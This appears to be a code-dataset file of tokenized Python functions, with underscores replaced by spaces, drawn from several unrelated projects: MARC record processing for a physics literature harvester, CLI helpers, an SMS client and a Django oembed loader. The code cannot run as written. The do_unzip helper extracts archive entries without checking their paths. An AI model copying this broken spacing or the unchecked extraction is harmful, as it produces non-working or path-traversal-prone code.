def update journals ( self ) : for field in record get field instances ( self . record , '773' ) : subs = field get subfield instances ( field ) new subs = [ ] volume letter = "" journal name = "" for idx , ( key , value ) in enumerate ( subs ) : if key == 'p' : journal name = self . get config item ( value , "journals" , allow substring = False ) # Make sure journal names have the form (dot)(space) (I know it's horrible) journal name = journal name . replace ( '. ' , '.' ) . replace ( '.' , '. ' ) . replace ( '. ,' , '.,' ) . strip ( ) elif key == 'v' : volume letter = value else : new subs . append ( ( key , value ) ) if not journal name == "Po S" : # Special handling of journal name and volumes, except Po S letter = return letters from string ( volume letter ) if letter : journal name = "{0} {1}" . format ( journal name , letter ) volume letter = volume letter . strip ( letter ) if journal name : new subs . append ( ( "p" , journal name ) ) if volume letter : new subs . append ( ( "v" , volume letter ) ) record delete field ( self . record , tag = "773" , field position global = field [ 4 ] ) record add field ( self . record , "773" , subfields = new subs )
def update thesis information ( self ) : fields 501 = record get field instances ( self . record , '502' ) for field in fields 501 : new subs = [ ] for key , value in field [ 0 ] : if key == 'b' : new subs . append ( ( 'a' , value ) ) elif key == 'c' : new subs . append ( ( 'b' , value ) ) elif key == 'd' : new subs . append ( ( 'c' , value ) ) else : new subs . append ( ( key , value ) ) record delete field ( self . record , tag = "502" , field position global = field [ 4 ] ) record add field ( self . record , "502" , subfields = new subs )
def update pagenumber ( self ) : pages = record get field instances ( self . record , '300' ) for field in pages : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : field [ 0 ] [ idx ] = ( 'a' , "{0} p" . format ( value ) )
def update date ( self ) : dates 269 = record get field instances ( self . record , '269' ) for idx , field in enumerate ( dates 269 ) : new subs = [ ] old subs = field [ 0 ] for code , value in old subs : if code == "c" : new subs . append ( ( "c" , convert date from iso to human ( value ) ) ) else : new subs . append ( ( code , value ) ) dates 269 [ idx ] = field swap subfields ( field , new subs )
def update date year ( self ) : dates = record get field instances ( self . record , '260' ) for field in dates : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'c' : field [ 0 ] [ idx ] = ( 'c' , value [ : 4 ] ) elif key == 't' : del field [ 0 ] [ idx ] if not dates : published years = record get field values ( self . record , "773" , code = "y" ) if published years : record add field ( self . record , "260" , subfields = [ ( "c" , published years [ 0 ] [ : 4 ] ) ] ) else : other years = record get field values ( self . record , "269" , code = "c" ) if other years : record add field ( self . record , "260" , subfields = [ ( "c" , other years [ 0 ] [ : 4 ] ) ] )
def fix name capitalization ( lastname , givennames ) : lastnames = lastname . split ( ) if len ( lastnames ) == 1 : if '-' in lastname : names = lastname . split ( '-' ) names = map ( lambda a : a [ 0 ] + a [ 1 : ] . lower ( ) , names ) lastname = '-' . join ( names ) else : lastname = lastname [ 0 ] + lastname [ 1 : ] . lower ( ) else : names = [ ] for name in lastnames : if re . search ( r'[A-Z]\.' , name ) : names . append ( name ) else : names . append ( name [ 0 ] + name [ 1 : ] . lower ( ) ) lastname = ' ' . join ( names ) lastname = collapse initials ( lastname ) names = [ ] for name in givennames : if re . search ( r'[A-Z]\.' , name ) : names . append ( name ) else : names . append ( name [ 0 ] + name [ 1 : ] . lower ( ) ) givennames = ' ' . join ( names ) return lastname , givennames
def autodiscover ( ) : import imp from django . conf import settings for app in settings . INSTALLED APPS : try : app path = import ( app , { } , { } , [ app . split ( '.' ) [ - 1 ] ] ) . path except Attribute Error : continue try : imp . find module ( 'oembed providers' , app path ) except Import Error : continue import ( "%s.oembed providers" % app )
def select ( options = None ) : if not options : return None width = len ( str ( len ( options ) ) ) for x , option in enumerate ( options ) : sys . stdout . write ( '{:{width}}) {}\n' . format ( x + 1 , option , width = width ) ) sys . stdout . write ( '{:>{width}} ' . format ( '#?' , width = width + 1 ) ) sys . stdout . flush ( ) if sys . stdin . isatty ( ) : # regular prompt try : response = raw input ( ) . strip ( ) except ( EOF Error , Keyboard Interrupt ) : # handle ctrl-d, ctrl-c response = '' else : # try connecting to current tty, when using pipes sys . stdin = open ( "/dev/tty" ) try : response = '' while True : response += sys . stdin . read ( 1 ) if response . endswith ( '\n' ) : break except ( EOF Error , Keyboard Interrupt ) : sys . stdout . flush ( ) pass try : response = int ( response ) - 1 except Value Error : return None if response < 0 or response >= len ( options ) : return None return options [ response ]
def err ( format msg , * args , * * kwargs ) : exc info = kwargs . pop ( "exc info" , False ) stderr . warning ( str ( format msg ) . format ( * args , * * kwargs ) , exc info = exc info )
def out ( format msg = "" , * args , * * kwargs ) : logmethod = kwargs . get ( "logmethod" , stdout . info ) if format msg != "" : if Prefix . has ( ) : if isinstance ( format msg , basestring ) : format msg = Prefix . get ( ) + format msg else : format msg = Prefix . get ( ) + str ( format msg ) if isinstance ( format msg , basestring ) : if args or kwargs : s = format msg . format ( * args , * * kwargs ) else : s = format msg logmethod ( s ) #             width = globals()["width"] #             s = textwrap.fill(s, width=width) #             stdout.info(s) else : logmethod ( str ( format msg ) ) else : logmethod ( "" )
def verbose ( format msg = "" , * args , * * kwargs ) : kwargs [ "logmethod" ] = stdout . debug out ( format msg , * args , * * kwargs )
def inject quiet ( levels ) : loggers = list ( Logger . manager . logger Dict . items ( ) ) loggers . append ( ( "root" , get Logger ( ) ) ) level filter = Level Filter ( levels ) for logger name , logger in loggers : for handler in getattr ( logger , "handlers" , [ ] ) : handler . add Filter ( level filter )
def connect ( self ) : for tried connection count in range ( CFG FTP CONNECTION ATTEMPTS ) : try : self . ftp = Ftp Handler ( self . config . OXFORD . URL , self . config . OXFORD . LOGIN , self . config . OXFORD . PASSWORD ) self . logger . debug ( ( "Successful connection to the " "Oxford University Press server" ) ) return except socket timeout exception as err : self . logger . error ( ( 'Failed to connect %d of %d times. ' 'Will sleep for %d seconds and try again.' ) % ( tried connection count + 1 , CFG FTP CONNECTION ATTEMPTS , CFG FTP TIMEOUT SLEEP DURATION ) ) time . sleep ( CFG FTP TIMEOUT SLEEP DURATION ) except Exception as err : self . logger . error ( ( 'Failed to connect to the Oxford ' 'University Press server. %s' ) % ( err , ) ) break raise Login Exception ( err )
def extract packages ( self ) : if not hasattr ( self , "retrieved packages unpacked" ) : self . retrieved packages unpacked = [ self . package name ] for path in self . retrieved packages unpacked : package name = basename ( path ) self . path unpacked = join ( CFG UNPACKED FILES , package name . split ( '.' ) [ 0 ] ) self . logger . debug ( "Extracting package: %s" % ( path . split ( "/" ) [ - 1 ] , ) ) try : if " archival pdf" in self . path unpacked : self . path unpacked = ( self . path unpacked . rstrip ( " archival pdf" ) ) Zip File ( path ) . extractall ( join ( self . path unpacked , "archival pdfs" ) ) else : Zip File ( path ) . extractall ( self . path unpacked ) #Tar File.open(path).extractall(self.path unpacked) except Exception : register exception ( alert admin = True , prefix = "OUP error extracting package." ) self . logger . error ( "Error extraction package file: %s" % ( path , ) ) if hasattr ( self , "path unpacked" ) : return self . path unpacked
def authenticate ( self ) : if self . session id : LOGGER . debug ( "Using existing Nu Heat session" ) return LOGGER . debug ( "Creating Nu Heat session" ) post data = { "Email" : self . username , "Password" : self . password , "application" : "0" } data = self . request ( config . AUTH URL , method = "POST" , data = post data ) session id = data . get ( "Session Id" ) if not session id : raise Exception ( "Authentication error" ) self . session id = session id
def handle starttag ( self , tag , attrs ) : if tag in self . mathml elements : final attr = "" for key , value in attrs : final attr += ' {0}="{1}"' . format ( key , value ) self . fed . append ( "<{0}{1}>" . format ( tag , final attr ) )
def handle endtag ( self , tag ) : if tag in self . mathml elements : self . fed . append ( "</{0}>" . format ( tag ) )
def html to text ( cls , html ) : s = cls ( ) s . feed ( html ) unescaped data = s . unescape ( s . get data ( ) ) return escape for xml ( unescaped data , tags to keep = s . mathml elements )
def is instance ( self ) : ret = False val = self . callback if self . is class ( ) : return False ret = not inspect . isfunction ( val ) and not inspect . ismethod ( val ) #         if is py2: #             ret = isinstance(val, types.Instance Type) or hasattr(val, ' dict ') \ #                 and not (hasattr(val, 'func name') or hasattr(val, 'im func')) #  #         else: #             ret = not inspect.isfunction(val) and not inspect.ismethod(val) return ret
def is function ( self ) : if self . is instance ( ) or self . is class ( ) : return False return isinstance ( self . callback , ( Callable , classmethod ) )
def make user agent ( component = None ) : packageinfo = pkg resources . require ( "harvestingkit" ) [ 0 ] useragent = "{0}/{1}" . format ( packageinfo . project name , packageinfo . version ) if component is not None : useragent += " {0}" . format ( component ) return useragent
def record add field ( rec , tag , ind1 = '' , ind2 = '' , subfields = [ ] , controlfield value = '' ) : if controlfield value : doc = etree . Element ( "controlfield" , attrib = { "tag" : tag , } ) doc . text = unicode ( controlfield value ) else : doc = etree . Element ( "datafield" , attrib = { "tag" : tag , "ind1" : ind1 , "ind2" : ind2 , } ) for code , value in subfields : field = etree . Sub Element ( doc , "subfield" , attrib = { "code" : code } ) field . text = value rec . append ( doc ) return rec
def record xml output ( rec , pretty = True ) : from . html utils import Math ML Parser ret = etree . tostring ( rec , xml declaration = False ) # Special Math ML handling ret = re . sub ( "(&lt;)(([\/]?{0}))" . format ( "|[\/]?" . join ( Math ML Parser . mathml elements ) ) , '<\g<2>' , ret ) ret = re . sub ( "&gt;" , '>' , ret ) if pretty : # We are doing our own prettyfication as etree pretty print is too insane. ret = ret . replace ( '</datafield>' , '  </datafield>\n' ) ret = re . sub ( r'<datafield(.*?)>' , r'  <datafield\1>\n' , ret ) ret = ret . replace ( '</subfield>' , '</subfield>\n' ) ret = ret . replace ( '<subfield' , '    <subfield' ) ret = ret . replace ( 'record>' , 'record>\n' ) return ret
def format arxiv id ( arxiv id ) : if arxiv id and "/" not in arxiv id and "ar Xiv" not in arxiv id : return "ar Xiv:%s" % ( arxiv id , ) elif arxiv id and '.' not in arxiv id and arxiv id . lower ( ) . startswith ( 'arxiv:' ) : return arxiv id [ 6 : ] # strip away arxiv: for old identifiers else : return arxiv id
def fix journal name ( journal , knowledge base ) : if not journal : return '' , '' if not knowledge base : return journal , '' if len ( journal ) < 2 : return journal , '' volume = '' if ( journal [ - 1 ] <= 'Z' and journal [ - 1 ] >= 'A' ) and ( journal [ - 2 ] == '.' or journal [ - 2 ] == ' ' ) : volume += journal [ - 1 ] journal = journal [ : - 1 ] journal = journal . strip ( ) if journal . upper ( ) in knowledge base : journal = knowledge base [ journal . upper ( ) ] . strip ( ) elif journal in knowledge base : journal = knowledge base [ journal ] . strip ( ) elif '.' in journal : journalnodots = journal . replace ( '. ' , ' ' ) journalnodots = journalnodots . replace ( '.' , ' ' ) . strip ( ) . upper ( ) if journalnodots in knowledge base : journal = knowledge base [ journalnodots ] . strip ( ) journal = journal . replace ( '. ' , '.' ) return journal , volume
def add nations field ( authors subfields ) : from . config import NATIONS DEFAULT MAP result = [ ] for field in authors subfields : if field [ 0 ] == 'v' : values = [ x . replace ( '.' , '' ) for x in field [ 1 ] . split ( ', ' ) ] possible affs = filter ( lambda x : x is not None , map ( NATIONS DEFAULT MAP . get , values ) ) if 'CERN' in possible affs and 'Switzerland' in possible affs : # Don't use remove in case of multiple Switzerlands possible affs = [ x for x in possible affs if x != 'Switzerland' ] result . extend ( possible affs ) result = sorted ( list ( set ( result ) ) ) if result : authors subfields . extend ( [ ( 'w' , res ) for res in result ] ) else : authors subfields . append ( ( 'w' , 'HUMAN CHECK' ) )
def fix dashes ( string ) : string = string . replace ( u'\u05BE' , '-' ) string = string . replace ( u'\u1806' , '-' ) string = string . replace ( u'\u2E3A' , '-' ) string = string . replace ( u'\u2E3B' , '-' ) string = unidecode ( string ) return re . sub ( r'--+' , '-' , string )
def fix title capitalization ( title ) : if re . search ( "[A-Z]" , title ) and re . search ( "[a-z]" , title ) : return title word list = re . split ( ' +' , title ) final = [ word list [ 0 ] . capitalize ( ) ] for word in word list [ 1 : ] : if word . upper ( ) in COMMON ACRONYMS : final . append ( word . upper ( ) ) elif len ( word ) > 3 : final . append ( word . capitalize ( ) ) else : final . append ( word . lower ( ) ) return " " . join ( final )
def convert html subscripts to latex ( text ) : text = re . sub ( "<sub>(.*?)</sub>" , r"$ {\1}$" , text ) text = re . sub ( "<sup>(.*?)</sup>" , r"$^{\1}$" , text ) return text
def download file ( from url , to filename = None , chunk size = 1024 * 8 , retry count = 3 ) : if not to filename : to filename = get temporary file ( ) session = requests . Session ( ) adapter = requests . adapters . HTTP Adapter ( max retries = retry count ) session . mount ( from url , adapter ) response = session . get ( from url , stream = True ) with open ( to filename , 'wb' ) as fd : for chunk in response . iter content ( chunk size ) : fd . write ( chunk ) return to filename
def run shell command ( commands , * * kwargs ) : p = subprocess . Popen ( commands , stdout = subprocess . PIPE , stderr = subprocess . PIPE , * * kwargs ) output , error = p . communicate ( ) return p . returncode , output , error
def create logger ( name , filename = None , logging level = logging . DEBUG ) : logger = logging . get Logger ( name ) formatter = logging . Formatter ( ( '%(asctime)s - %(name)s - ' '%(levelname)-8s - %(message)s' ) ) if filename : fh = logging . File Handler ( filename = filename ) fh . set Formatter ( formatter ) logger . add Handler ( fh ) ch = logging . Stream Handler ( ) ch . set Formatter ( formatter ) logger . add Handler ( ch ) logger . set Level ( logging level ) return logger
def do unzip ( zipped file , output directory ) : z = zipfile . Zip File ( zipped file ) for path in z . namelist ( ) : relative path = os . path . join ( output directory , path ) dirname , dummy = os . path . split ( relative path ) try : if relative path . endswith ( os . sep ) and not os . path . exists ( dirname ) : os . makedirs ( relative path ) elif not os . path . exists ( relative path ) : dirname = os . path . join ( output directory , os . path . dirname ( path ) ) if os . path . dirname ( path ) and not os . path . exists ( dirname ) : os . makedirs ( dirname ) fd = open ( relative path , "w" ) fd . write ( z . read ( path ) ) fd . close ( ) except IO Error , e : raise e return output directory
def locate ( pattern , root = os . curdir ) : for path , dummy , files in os . walk ( os . path . abspath ( root ) ) : for filename in fnmatch . filter ( files , pattern ) : yield os . path . join ( path , filename )
def convert date to iso ( value ) : date formats = [ "%d %b %Y" , "%Y/%m/%d" ] for dformat in date formats : try : date = datetime . strptime ( value , dformat ) return date . strftime ( "%Y-%m-%d" ) except Value Error : pass return value
def convert date from iso to human ( value ) : try : year , month , day = value . split ( "-" ) except Value Error : # Not separated by "-". Space? try : year , month , day = value . split ( " " ) except Value Error : # What gives? OK, lets just return as is return value try : date object = datetime ( int ( year ) , int ( month ) , int ( day ) ) except Type Error : return value return date object . strftime ( "%d %b %Y" )
def get temporary file ( prefix = "tmp " , suffix = "" , directory = None ) : try : file fd , filepath = mkstemp ( prefix = prefix , suffix = suffix , dir = directory ) os . close ( file fd ) except IO Error , e : try : os . remove ( filepath ) except Exception : pass raise e return filepath
def return letters from string ( text ) : out = "" for letter in text : if letter . isalpha ( ) : out += letter return out
def license is oa ( license ) : for oal in OA LICENSES : if re . search ( oal , license ) : return True return False
def extract package ( self ) : self . path = mkdtemp ( prefix = "scoap3 package " , dir = CFG TMPSHAREDDIR ) self . logger . debug ( "Extracting package: %s" % ( self . package name , ) ) scoap3utils extract package ( self . package name , self . path , self . logger )
def get publication date ( self , xml doc ) : start date = get value in tag ( xml doc , "prism:cover Date" ) if not start date : start date = get value in tag ( xml doc , "prism:cover Display Date" ) if not start date : start date = get value in tag ( xml doc , 'oa:open Access Effective' ) if start date : start date = datetime . datetime . strptime ( start date , "%Y-%m-%d T%H:%M:%SZ" ) return start date . strftime ( "%Y-%m-%d" ) import dateutil . parser #dateutil.parser.parse cant process dates like April-June 2016 start date = re . sub ( '([A-Z][a-z]+)[\s\-][A-Z][a-z]+ (\d{4})' , r'\1 \2' , start date ) try : date = dateutil . parser . parse ( start date ) except Value Error : return '' # Special case where we ignore the deduced day form dateutil # in case it was not given in the first place. if len ( start date . split ( " " ) ) == 3 : return date . strftime ( "%Y-%m-%d" ) else : return date . strftime ( "%Y-%m" ) else : if len ( start date ) is 8 : start date = time . strftime ( '%Y-%m-%d' , time . strptime ( start date , '%Y%m%d' ) ) elif len ( start date ) is 6 : start date = time . strftime ( '%Y-%m' , time . strptime ( start date , '%Y%m' ) ) return start date
def parser ( self ) : module = self . module subcommands = self . subcommands if subcommands : module desc = inspect . getdoc ( module ) parser = Parser ( description = module desc , module = module ) subparsers = parser . add subparsers ( ) for sc name , callback in subcommands . items ( ) : sc name = sc name . replace ( " " , "-" ) cb desc = inspect . getdoc ( callback ) sc parser = subparsers . add parser ( sc name , callback = callback , help = cb desc ) else : parser = Parser ( callback = self . callbacks [ self . function name ] , module = module ) return parser
def module ( self ) : # we have to guard this value because: # https://thingspython.wordpress.com/2010/09/27/another-super-wrinkle-raising-typeerror/ if not hasattr ( self , ' module' ) : if " main " in sys . modules : mod = sys . modules [ " main " ] path = self . normalize path ( mod . file ) if os . path . splitext ( path ) == os . path . splitext ( self . path ) : self . module = mod else : # http://stackoverflow.com/questions/67631/how-to-import-a-module-given-the-full-path self . module = imp . load source ( 'captain script' , self . path ) #self. module = imp.load source(self.module name, self.path) return self . module
def body ( self ) : if not hasattr ( self , ' body' ) : self . body = inspect . getsource ( self . module ) return self . body
def run ( self , raw args ) : parser = self . parser args , kwargs = parser . parse callback args ( raw args ) callback = kwargs . pop ( "main callback" ) if parser . has injected quiet ( ) : levels = kwargs . pop ( "quiet inject" , "" ) logging . inject quiet ( levels ) try : ret code = callback ( * args , * * kwargs ) ret code = int ( ret code ) if ret code else 0 except Arg Error as e : # https://hg.python.org/cpython/file/2.7/Lib/argparse.py#l2374 echo . err ( "{}: error: {}" , parser . prog , str ( e ) ) ret code = 2 return ret code
def can run from cli ( self ) : ret = False ast tree = ast . parse ( self . body , self . path ) calls = self . find calls ( ast tree , name , "exit" ) for call in calls : if re . search ( "{}\(" . format ( re . escape ( call ) ) , self . body ) : ret = True break return ret
def mock request ( ) : current site = Site . objects . get current ( ) request = Http Request ( ) request . META [ 'SERVER NAME' ] = current site . domain return request
def get record ( self ) : self . update system numbers ( ) self . add systemnumber ( "CDS" ) self . fields list = [ "024" , "041" , "035" , "037" , "088" , "100" , "110" , "111" , "242" , "245" , "246" , "260" , "269" , "300" , "502" , "650" , "653" , "693" , "700" , "710" , "773" , "856" , "520" , "500" , "980" ] self . keep only fields ( ) self . determine collections ( ) self . add cms link ( ) self . update languages ( ) self . update reportnumbers ( ) self . update date ( ) self . update pagenumber ( ) self . update authors ( ) self . update subject categories ( "Sz Ge CERN" , "INSPIRE" , "categories inspire" ) self . update keywords ( ) self . update experiments ( ) self . update collaboration ( ) self . update journals ( ) self . update links and ffts ( ) if 'THESIS' in self . collections : self . update thesis supervisors ( ) self . update thesis information ( ) if 'NOTE' in self . collections : self . add notes ( ) for collection in self . collections : record add field ( self . record , tag = '980' , subfields = [ ( 'a' , collection ) ] ) self . remove controlfields ( ) return self . record
def determine collections ( self ) : for value in record get field values ( self . record , '980' , code = 'a' ) : if 'NOTE' in value . upper ( ) : self . collections . add ( 'NOTE' ) if 'THESIS' in value . upper ( ) : self . collections . add ( 'THESIS' ) if 'CONFERENCEPAPER' in value . upper ( ) : self . collections . add ( 'Conference Paper' ) if "HIDDEN" in value . upper ( ) : self . hidden = True if self . is published ( ) : self . collections . add ( "PUBLISHED" ) self . collections . add ( "CITEABLE" ) if 'NOTE' not in self . collections : from itertools import product # TODO: Move this to a KB kb = [ 'ATLAS-CONF-' , 'CMS-PAS-' , 'ATL-' , 'CMS-DP-' , 'ALICE-INT-' , 'LH Cb-PUB-' ] values = record get field values ( self . record , "088" , code = 'a' ) for val , rep in product ( values , kb ) : if val . startswith ( rep ) : self . collections . add ( 'NOTE' ) break # 980 Arxiv tag if record get field values ( self . record , '035' , filter subfield code = "a" , filter subfield value = "ar Xiv" ) : self . collections . add ( "ar Xiv" ) # 980 HEP && CORE self . collections . add ( 'HEP' ) self . collections . add ( 'CORE' ) # 980 Conference Note if 'Conference Paper' not in self . collections : for value in record get field values ( self . record , tag = '962' , code = 'n' ) : if value [ - 2 : ] . isdigit ( ) : self . collections . add ( 'Conference Paper' ) break # Clear out any existing ones. record delete fields ( self . record , "980" )
def add cms link ( self ) : intnote = record get field values ( self . record , '690' , filter subfield code = "a" , filter subfield value = 'INTNOTE' ) if intnote : val 088 = record get field values ( self . record , tag = '088' , filter subfield code = "a" ) for val in val 088 : if 'CMS' in val : url = ( 'http://weblib.cern.ch/abstract?CERN-CMS' + val . split ( 'CMS' , 1 ) [ - 1 ] ) record add field ( self . record , tag = '856' , ind1 = '4' , subfields = [ ( 'u' , url ) ] )
def update date ( self ) : for field in record get field instances ( self . record , '269' ) : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == "c" : field [ 0 ] [ idx ] = ( "c" , convert date to iso ( value ) ) record delete fields ( self . record , "260" ) if 'THESIS' not in self . collections : for field in record get field instances ( self . record , '260' ) : record add field ( self . record , '269' , subfields = field [ 0 ] ) record delete fields ( self . record , '260' )
def update pagenumber ( self ) : for field in record get field instances ( self . record , '300' ) : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : if "mult." not in value and value != " p" : field [ 0 ] [ idx ] = ( 'a' , re . sub ( r'[^\d-]+' , '' , value ) ) else : record delete field ( self . record , '300' , field position global = field [ 4 ] ) break
def update authors ( self ) : author names = record get field instances ( self . record , '100' ) author names . extend ( record get field instances ( self . record , '700' ) ) for field in author names : subs = field get subfields ( field ) if 'i' not in subs or 'XX' in subs [ 'i' ] : if 'j' not in subs or 'YY' in subs [ 'j' ] : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : field [ 0 ] [ idx ] = ( 'a' , punctuate authorname ( value ) )
def update thesis information ( self ) : fields 501 = record get field instances ( self . record , '502' ) for idx , field in enumerate ( fields 501 ) : new subs = [ ] for key , value in field [ 0 ] : if key == 'a' : new subs . append ( ( 'b' , value ) ) elif key == 'b' : new subs . append ( ( 'c' , value ) ) elif key == 'c' : new subs . append ( ( 'd' , value ) ) else : new subs . append ( ( key , value ) ) fields 501 [ idx ] = field swap subfields ( field , new subs )
def update keywords ( self ) : for field in record get field instances ( self . record , '653' , ind1 = '1' ) : subs = field get subfields ( field ) new subs = [ ] if 'a' in subs : for val in subs [ 'a' ] : new subs . extend ( [ ( '9' , 'author' ) , ( 'a' , val ) ] ) new field = create field ( subfields = new subs , ind1 = '1' ) record replace field ( self . record , '653' , new field , field position global = field [ 4 ] )
def update journals ( self ) : for field in record get field instances ( self . record , '773' ) : subs = field get subfield instances ( field ) new subs = [ ] for idx , ( key , value ) in enumerate ( subs ) : if key == 'p' : journal name = self . get config item ( value , "journals" , allow substring = False ) journal name = journal name . replace ( '. ' , '.' ) . strip ( ) new subs . append ( ( key , journal name ) ) else : new subs . append ( ( key , value ) ) record delete field ( self . record , tag = "773" , field position global = field [ 4 ] ) record add field ( self . record , "773" , subfields = new subs )
def extract packages ( self ) : self . path unpacked = [ ] if not hasattr ( self , "retrieved packages unpacked" ) : self . retrieved packages unpacked = [ self . package name ] for path in self . retrieved packages unpacked : self . logger . debug ( "Extracting package: %s" % ( path , ) ) p name = 'EPJC' if 'EPJC' in path else 'JHEP' p message = 'scoap3 package %s %s ' % ( p name , datetime . now ( ) ) self . path unpacked . append ( mkdtemp ( prefix = p message , dir = CFG TMPSHAREDDIR ) ) try : Zip File ( path ) . extractall ( self . path unpacked [ - 1 ] ) except Exception : register exception ( alert admin = True , prefix = "Springer error extracting package." ) self . logger . error ( "Error extraction package file: %s" % ( path , ) ) return self . path unpacked
def record delete subfield ( rec , tag , subfield code , ind1 = ' ' , ind2 = ' ' ) : ind1 , ind2 = wash indicators ( ind1 , ind2 ) for field in rec . get ( tag , [ ] ) : if field [ 1 ] == ind1 and field [ 2 ] == ind2 : field [ 0 ] [ : ] = [ subfield for subfield in field [ 0 ] if subfield code != subfield [ 0 ] ]
def record replace field ( rec , tag , new field , field position global = None , field position local = None ) : if field position global is None and field position local is None : raise Invenio Bib Record Field Error ( "A field position is required to " "complete this operation." ) elif field position global is not None and field position local is not None : raise Invenio Bib Record Field Error ( "Only one field position is required " "to complete this operation." ) elif field position global : if tag not in rec : raise Invenio Bib Record Field Error ( "No tag '%s' in record." % tag ) replaced = False for position , field in enumerate ( rec [ tag ] ) : if field [ 4 ] == field position global : rec [ tag ] [ position ] = new field replaced = True if not replaced : raise Invenio Bib Record Field Error ( "No field has the tag '%s' and " "the global field position '%d'." % ( tag , field position global ) ) else : try : rec [ tag ] [ field position local ] = new field except Key Error : raise Invenio Bib Record Field Error ( "No tag '%s' in record." % tag ) except Index Error : raise Invenio Bib Record Field Error ( "No field has the tag '%s' and " "the local field position '%d'." % ( tag , field position local ) )
def record modify controlfield ( rec , tag , controlfield value , field position global = None , field position local = None ) : field = record get field ( rec , tag , field position global = field position global , field position local = field position local ) new field = ( field [ 0 ] , field [ 1 ] , field [ 2 ] , controlfield value , field [ 4 ] ) record replace field ( rec , tag , new field , field position global = field position global , field position local = field position local )
def field xml output ( field , tag ) : marcxml = [ ] if field [ 3 ] : marcxml . append ( '  <controlfield tag="%s">%s</controlfield>' % ( tag , Math ML Parser . html to text ( field [ 3 ] ) ) ) else : marcxml . append ( '  <datafield tag="%s" ind1="%s" ind2="%s">' % ( tag , field [ 1 ] , field [ 2 ] ) ) marcxml += [ subfield xml output ( subfield ) for subfield in field [ 0 ] ] marcxml . append ( '  </datafield>' ) return '\n' . join ( marcxml )
def record strip empty volatile subfields ( rec ) : for tag in rec . keys ( ) : for field in rec [ tag ] : field [ 0 ] [ : ] = [ subfield for subfield in field [ 0 ] if subfield [ 1 ] [ : 9 ] != "VOLATILE:" ]
def record make all subfields volatile ( rec ) : for tag in rec . keys ( ) : for field position , field in enumerate ( rec [ tag ] ) : for subfield position , subfield in enumerate ( field [ 0 ] ) : if subfield [ 1 ] [ : 9 ] != "VOLATILE:" : record modify subfield ( rec , tag , subfield [ 0 ] , "VOLATILE:" + subfield [ 1 ] , subfield position , field position local = field position )
def record sort by indicators ( record ) : for tag , fields in record . items ( ) : record [ tag ] = fields sort by indicators ( fields )
def get children by tag name ( node , name ) : try : return [ child for child in node . child Nodes if child . node Name == name ] except Type Error : return [ ]
def parse ( self , path to xml = None ) : if not path to xml : if not self . path : self . logger . error ( "No path defined!" ) return path to xml = self . path root = self . clean xml ( path to xml ) # See first of this XML is clean or OAI request if root . tag . lower ( ) == 'collection' : tree = ET . Element Tree ( root ) self . records = element tree collection to records ( tree ) elif root . tag . lower ( ) == 'record' : new root = ET . Element ( 'collection' ) new root . append ( root ) tree = ET . Element Tree ( new root ) self . records = element tree collection to records ( tree ) else : # We have an OAI request header subs = get request subfields ( root ) records = root . find ( 'List Records' ) if records is None : records = root . find ( 'Get Record' ) if records is None : raise Value Error ( "Cannot find List Records or Get Record!" ) tree = ET . Element Tree ( records ) for record , is deleted in element tree oai records ( tree , header subs ) : if is deleted : # It was OAI deleted. Create special record self . deleted records . append ( self . create deleted record ( record ) ) else : self . records . append ( record )
def create deleted record ( self , record ) : identifier = record get field value ( record , tag = "037" , code = "a" ) recid = identifier . split ( ":" ) [ - 1 ] try : source = identifier . split ( ":" ) [ 1 ] except Index Error : source = "Unknown" record add field ( record , "035" , subfields = [ ( "9" , source ) , ( "a" , recid ) ] ) record add field ( record , "980" , subfields = [ ( "c" , "DELETED" ) ] ) return record
def login ( self , session , get request = False ) : req = session . post ( self . login url , data = self . logindata ) if LOGIN ERROR STRING in req . text or req . status code == 403 or req . url == LOGIN URL : err mess = "Yesss SMS: login failed, username or password wrong" if LOGIN LOCKED MESS in req . text : err mess += ", page says: " + LOGIN LOCKED MESS ENG self . suspended = True raise self . Account Suspended Error ( err mess ) raise self . Login Error ( err mess ) self . suspended = False # login worked return ( session , req ) if get request else session
def login data valid ( self ) : login working = False try : with self . login ( requests . Session ( ) ) as sess : sess . get ( self . logout url ) except self . Login Error : pass else : login working = True return login working
def send ( self , recipient , message ) : if self . logindata [ 'login rufnummer' ] is None or self . logindata [ 'login passwort' ] is None : err mess = "Yesss SMS: Login data required" raise self . Login Error ( err mess ) if not recipient : raise self . No Recipient Error ( "Yesss SMS: recipient number missing" ) if not isinstance ( recipient , str ) : raise Value Error ( "Yesss SMS: str expected as recipient number" ) if not message : raise self . Empty Message Error ( "Yesss SMS: message is empty" ) with self . login ( requests . Session ( ) ) as sess : sms data = { 'to nummer' : recipient , 'nachricht' : message } req = sess . post ( self . websms url , data = sms data ) if not ( req . status code == 200 or req . status code == 302 ) : raise self . SMS Sending Error ( "Yesss SMS: error sending SMS" ) if UNSUPPORTED CHARS STRING in req . text : raise self . Unsupported Chars Error ( "Yesss SMS: message contains unsupported character(s)" ) if SMS SENDING SUCCESSFUL STRING not in req . text : raise self . SMS Sending Error ( "Yesss SMS: error sending SMS" ) sess . get ( self . logout url )
def get date ( self , filename ) : try : self . document = parse ( filename ) return self . get date ( ) except Date Not Found Exception : print ( "Date problem found in {0}" . format ( filename ) ) return datetime . datetime . strftime ( datetime . datetime . now ( ) , "%Y-%m-%d" )
def get collection ( self , journal ) : conference = '' for tag in self . document . get Elements By Tag Name ( 'conference' ) : conference = xml to text ( tag ) if conference or journal == "International Journal of Modern Physics: Conference Series" : return [ ( 'a' , 'HEP' ) , ( 'a' , 'Conference Paper' ) ] elif self . get article type ( ) == "review-article" : return [ ( 'a' , 'HEP' ) , ( 'a' , 'Review' ) ] else : return [ ( 'a' , 'HEP' ) , ( 'a' , 'Published' ) ]
def attach fulltext ( self , rec , doi ) : url = os . path . join ( self . url prefix , doi ) record add field ( rec , 'FFT' , subfields = [ ( 'a' , url ) , ( 't' , 'INSPIRE-PUBLIC' ) , ( 'd' , 'Fulltext' ) ] )
def get config item ( cls , key , kb name , allow substring = True ) : config dict = cls . kbs . get ( kb name , None ) if config dict : if key in config dict : return config dict [ key ] elif allow substring : res = [ v for k , v in config dict . items ( ) if key in k ] if res : return res [ 0 ] return key
